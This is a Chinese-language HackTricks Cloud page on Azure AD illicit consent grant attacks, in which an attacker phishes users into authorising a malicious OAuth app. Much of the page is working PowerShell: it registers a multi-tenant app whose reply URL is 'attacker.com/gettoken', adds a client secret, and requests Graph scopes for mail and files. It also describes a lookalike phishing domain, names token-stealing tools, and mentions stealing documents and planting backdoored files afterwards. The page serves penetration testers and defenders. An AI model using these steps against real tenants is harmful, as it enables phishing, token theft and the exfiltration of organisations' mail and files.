# Az - 非法同意授权

<details>

<summary><strong>支持 HackTricks 并获得福利！</strong></summary>

* 如果您想在 HackTricks 中看到您的公司广告，或者如果您想访问 PEASS 的最新版本或下载 HackTricks 的 PDF，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方 PEASS 和 HackTricks 商品**](https://peass.creator-spring.com)
* 发现[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFT**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注**我的 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) **和** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github 仓库提交 PR 来分享您的黑客技巧。**

</details>

## OAuth 应用钓鱼

**Azure 应用程序**会请求权限来访问**用户数据**（基本信息，以及访问文档、发送电子邮件等）。\
如果**允许**，普通用户只能授予对**"低影响"权限**的同意。在**其他所有**情况下，**需要管理员同意**。\
`GA`、`ApplicationAdministrator`、`CloudApplication` `Administrator` 和包括`授予应用程序权限的权限`的自定义角色可以提供租户范围的同意。

只有**不需要管理员同意**的权限被分类为**低影响**。这些权限是用于**基本登录的 openid、profile、email、User.Read 和 offline\_access**。如果一个**组织**允许用户对**所有应用**进行同意，员工可以同意一个应用程序来**从他们的个人资料中读取上述信息**。

<figure><img src="../../../.gitbook/assets/image (3) (2) (1).png" alt=""><figcaption></figcaption></figure>

因此，攻击者可以准备一个**恶意应用程序**，并通过**钓鱼**使用户**接受该应用程序并窃取他的数据**。

### 检查用户是否允许同意

检查用户是否允许同意应用程序：

{% code overflow="wrap" %}
```powershell
PS AzureADPreview> (GetAzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
```
{% endcode %}

* **禁用用户同意**：用户无法授予应用程序权限。
* **用户可以同意来自经过验证的发布者或您的组织的应用程序，但仅限于您选择的权限**：所有用户只能同意由经过验证的发布者发布的应用程序和在您的租户中注册的应用程序。
* **用户可以同意所有应用程序**：允许所有用户同意不需要管理员同意的任何权限。
* **自定义应用程序同意策略**

## **什么是非法同意授予攻击？**

在非法同意授予攻击中，攻击者创建一个**Azure注册的应用程序，请求访问诸如联系信息、电子邮件或文档等数据**。然后，攻击者欺骗最终用户同意该应用程序，以便攻击者可以访问目标用户可以访问的数据。在应用程序被授予同意后，它具有用户帐户级别的数据访问权限，无需组织帐户。

简单来说，当受害者点击那个漂亮的蓝色"接受"按钮时，Azure AD会向属于攻击者的第三方网站发送一个令牌，攻击者将使用该令牌代表受害者执行操作，如访问所有文件、读取邮件、发送邮件等。

## **攻击流程**

<figure><img src="../../../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>

为了对公司"ecorp"进行此攻击，攻击者可以注册一个名为"safedomainlogin.com"的域，并创建一个子域["ecorp.safedomainlogin.com"](http://ecorp.safedomainlogin.com/)，在其中**托管用于捕获授权代码的应用程序**，然后请求访问令牌。

然后，在Azure AD租户中注册一个多租户应用程序，将其命名为"ecorp"，并添加指向"ecorp.safedomainlogin.com"的重定向URL，该URL托管了一个用于捕获授权代码的应用程序。

攻击者还创建了一个新的客户端密钥，并在应用程序中添加了一些API**权限**，如`Mail.Read`、`Notes.Read.All`、`Files.ReadWrite.All`、`User.ReadBasic.All`、`User.Read`。因此，一旦**用户同意该应用程序**，攻击者就可以代表用户**提取**敏感信息。

最后，攻击者创建了包含恶意应用程序的客户端ID的**链接**，并与**目标用户**共享该链接，以获得他们的同意。

## 365-Stealer

您可以使用[**365-Stealer**](https://github.com/AlteredSecurity/365-Stealer)执行此攻击。

作为额外步骤，如果您对受害组织中的某个用户有一些**访问权限**，您可以检查策略是否允许他**接受应用程序**：
```powershell
Import-Module .\AzureADPreview\AzureADPreview.psd1
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("test@corp.onmicrosoft.com", $passwd)
Connect-AzureAD -Credential $creds
(Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
# If "ManagePermissionGrantsForSelf.microsoft-user-default-legacy", he can
```
对于这种攻击，您需要在Azure租户中创建一个**新的应用程序**（在应用程序注册中），例如，具有以下权限：

<figure><img src="../../../.gitbook/assets/image (2) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

`User.ReadBasic.All`位于`Microsoft Graph`的`委派权限`中。（应用程序权限始终需要额外的批准）。

* `User.ReadBasic.All`是一个权限，如果被授予，将允许您**读取组织中所有用户的信息**。
* 请记住，只有`GA`、`ApplicationAdministrator`、`CloudApplication` `Administrator`和包括`授予应用程序权限的权限`的自定义角色才能提供租户范围的同意。因此，如果您希望他批准需要管理员同意的**应用程序**，您应该**钓鱼一个具有这些角色之一的用户**。

您还可以通过cli创建一个应用程序：

{% code overflow="wrap" %}
```bash
# Generate Application
New-AzureADApplication -DisplayName "MyApp"  -ReplyUrls @("https://attacker.com", "https://attacker.com/gettoken") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true

# Generate Secret
New-AzureADApplicationPasswordCredential -ObjectId f76ebd35-xxxx-xxxx-xxxx-xxxxxxxxxxxx -CustomKeyIdentifier "MyAppSecret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

# Generate an application with the permissions
$objectid=New-AzureADApplication -DisplayName "AppName"  -ReplyUrls @("https://example.com/login/authorized") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true | select-object ObjectId
New-AzureADApplicationPasswordCredential -ObjectId $objectid.ObjectId -CustomKeyIdentifier "secret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

$AppObjectID = $objectid.ObjectId # object id in AD
$app = Get-AzureADApplication -ObjectId $AppObjectID
$AADAccess = $app.RequiredResourceAccess | Where-Object {$_.ResourceAppId -eq "00000003-0000-0000-c000-000000000000"}  # "00000003-0000-0000-c000-000000000000" represents Graph API
if($AADAccess -eq $null) {
$AADAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess
$AADAccess.ResourceAppId = "00000003-0000-0000-c000-000000000000"

$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)

$app.RequiredResourceAccess.Add($AADAccess)
} else {
$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)
}

Set-AzureADApplication -ObjectId $AppObjectID -RequiredResourceAccess $app.RequiredResourceAccess
Get-AzureADApplication -ObjectId $objectid.ObjectId | select-object appid
```
{% endcode %}

请查看[https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer)以了解如何配置它。

{% hint style="warning" %}
请注意，获取的**访问令牌**将用于具有以下范围的**图形终结点**：`User.Read`和`User.ReadBasic.All`（请求的权限）。您将无法执行其他操作（但这些足以**下载有关组织中所有用户的信息**）。
{% endhint %}

## [O365-Attack-Toolkit](https://github.com/mdsecactivebreach/o365-attack-toolkit)

您还可以使用此工具执行此攻击。

## 后渗透

一旦您获得了对用户的访问权限，您可以执行诸如窃取敏感文档甚至上传带后门的文档文件等操作。

## 参考资料

* 此帖子是从[https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer)复制的

<details>

<summary><strong>支持HackTricks并获得福利！</strong></summary>

* 如果您想在HackTricks中看到您的**公司广告**，或者如果您想访问**PEASS的最新版本或下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFT**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我的 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) **和** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github仓库提交PR来分享您的黑客技巧。**

</details>
